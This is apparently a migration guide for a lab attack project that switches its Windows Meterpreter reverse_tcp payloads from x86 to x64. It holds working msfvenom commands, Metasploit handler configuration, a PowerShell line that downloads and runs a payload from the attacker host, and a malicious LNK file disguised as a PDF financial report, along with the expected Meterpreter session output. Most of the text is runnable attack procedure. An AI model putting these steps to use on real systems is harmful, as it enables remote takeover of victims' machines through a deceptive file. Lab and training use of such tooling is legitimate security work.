# x64 Payload Migration Guide

## Overview

The entire project has been migrated to use **x64 (64-bit) Meterpreter payloads** as the default instead of x86 (32-bit). This fixes the exploit issue on Windows Server 2008 R2, which runs 64-bit PowerShell by default.

## What Changed

### Payload Architecture
- **Before**: `windows/meterpreter/reverse_tcp` (x86/32-bit)
- **After**: `windows/x64/meterpreter/reverse_tcp` (x64/64-bit)

### Files Updated

| Category | Files | Change |
|----------|-------|--------|
| **Payload Generation** | `vagrant/provisioning/kali/create_lnk_exploit.sh`<br>`exploits/lnk/setup_exploit_automated.sh` | Now generate x64 payloads |
| **Metasploit Handlers** | `exploits/lnk/start_lnk_attack.sh`<br>`exploits/start_attack.sh` | Now use x64 handler |
| **Documentation** | `LNK_EXPLOIT_GUIDE.md`<br>`HOW_TO_USE.md`<br>`TROUBLESHOOTING.md`<br>`INSTALLATION.md` | Updated examples to x64 |

## Regenerate Payload on Existing VMs

If you already have VMs running with the old x86 payload, you need to regenerate it.

### Option 1: Automated Regeneration (Recommended)

On Kali VM:

```bash
cd /vagrant/exploits/lnk
./setup_exploit_automated.sh
```

This will:
1. Delete old x86 payload
2. Generate new x64 payload
3. Regenerate LNK file (uses same x64 payload)
4. Test and verify files

### Option 2: Manual Regeneration

On Kali VM:

```bash
# Navigate to payload directory
cd /home/vagrant/lnk_payloads

# Remove old x86 payload
rm -f shell.ps1

# Generate new x64 payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.56.101 \
    LPORT=4444 \
    -a x64 \
    --platform windows \
    -f psh \
    -o shell.ps1

# Verify payload
ls -lh shell.ps1
head -20 shell.ps1
```

### Option 3: Fresh Provisioning

For a clean start:

```bash
# On host machine
cd vagrant
vagrant destroy -f
vagrant up
```

This provisions both VMs from scratch with x64 payloads.

## Verify x64 Payload

### Check Payload Architecture

On Kali:

```bash
cd /home/vagrant/lnk_payloads

# Check file size (x64 is slightly larger than x86)
ls -lh shell.ps1

# Check payload header
head -50 shell.ps1 | grep -i "x64\|x86\|architecture"

# Verify it's a valid PowerShell script
file shell.ps1
```

Expected output:
```
shell.ps1: ASCII text, with very long lines
Size: ~3-4KB (x64 payloads are similar size to x86)
```

### Test Payload Execution

On Windows:

```powershell
# Download and inspect payload
(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/shell.ps1') | Select-Object -First 10
```

This should show PowerShell code without errors.

## Metasploit Handler Configuration

### LNK Attack (Automated)

The `start_lnk_attack.sh` script now automatically uses x64 handler:

```bash
cd /vagrant/exploits/lnk
./start_lnk_attack.sh
```

Handler configuration (automatic):
```
PAYLOAD => windows/x64/meterpreter/reverse_tcp
LHOST => 192.168.56.101
LPORT => 4444
```

### Manual Handler (If Needed)

If starting Metasploit manually:

```bash
msfconsole -q
```

```ruby
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
set ReverseListenerBindAddress 192.168.56.101
set ExitOnSession false
exploit -j
```

## Testing After Migration

### Step 1: Verify HTTP Server

On Kali:

```bash
# Check if HTTP server is running
systemctl status lnk-http-server.service

# Or check port
ss -tlnp | grep 8080
```

Should show:
```
LISTEN  0  5  192.168.56.101:8080  0.0.0.0:*  users:(("python3"))
```

### Step 2: Verify Payload Download

On Windows:

```powershell
# Test download
Invoke-WebRequest -Uri http://192.168.56.101:8080/shell.ps1 -UseBasicParsing
```

Should succeed without errors.

### Step 3: Test Exploit End-to-End

**On Kali:**
```bash
cd /vagrant/exploits/lnk
./start_lnk_attack.sh
```

**On Windows:**
1. Download LNK file: `http://192.168.56.101:8080/Q4_Financial_Report.pdf.lnk`
2. Save to Desktop
3. Double-click the "PDF" file

**Expected result:**
```
[*] Sending stage (201798 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened
```

## Troubleshooting x64 Migration

### Issue: "No session was created"

**Cause**: Still using x86 payload or handler

**Fix**:
1. Verify payload is x64: `head /home/vagrant/lnk_payloads/shell.ps1`
2. Verify handler is x64: In msfconsole, `show options` should show `windows/x64/meterpreter/reverse_tcp`
3. Regenerate both if needed

### Issue: PowerShell execution error

**Cause**: Architecture mismatch between PowerShell and payload

**Check PowerShell architecture on Windows**:
```powershell
[System.Environment]::Is64BitProcess
```

Should return: `True` (64-bit PowerShell)

If returns `False`, you're running 32-bit PowerShell on a 64-bit system.

**Fix**: Use 64-bit PowerShell explicitly:
```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

### Issue: Session opens but immediately closes

**Cause**: Payload architecture mismatch

**Fix**: Ensure both payload AND handler are x64:
- Payload: `windows/x64/meterpreter/reverse_tcp`
- Handler: `set PAYLOAD windows/x64/meterpreter/reverse_tcp`

## Architecture Reference

| Windows Version | Default PowerShell | Recommended Payload |
|----------------|-------------------|---------------------|
| Windows Server 2008 R2 x64 | 64-bit | `windows/x64/meterpreter/reverse_tcp` |
| Windows Server 2012/2016/2019 | 64-bit | `windows/x64/meterpreter/reverse_tcp` |
| Windows 10/11 (64-bit) | 64-bit | `windows/x64/meterpreter/reverse_tcp` |
| Windows 7/8/10 (32-bit) | 32-bit | `windows/meterpreter/reverse_tcp` |

**Note**: Our lab uses Windows Server 2008 R2 x64, so x64 payload is required.

## Payload Variants (For Testing)

The `regenerate_payload.sh` script can create multiple variants:

```bash
cd /vagrant/exploits/lnk
./regenerate_payload.sh
```

Creates:
- `shell_x64.ps1` - 64-bit payload (now default)
- `shell_x86.ps1` - 32-bit payload (legacy)
- `shell_reflection.ps1` - Alternative loading method
- `shell_cmd.ps1` - Command-line optimized

To test specific variant:

```powershell
# On Windows
IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/shell_x64.ps1')
```

## Summary

The migration to x64 payloads ensures compatibility with modern 64-bit Windows systems. All new deployments will automatically use x64. Existing deployments should regenerate payloads using the automated script.

**Key takeaway**: Always match payload architecture (x86/x64) to target PowerShell architecture.
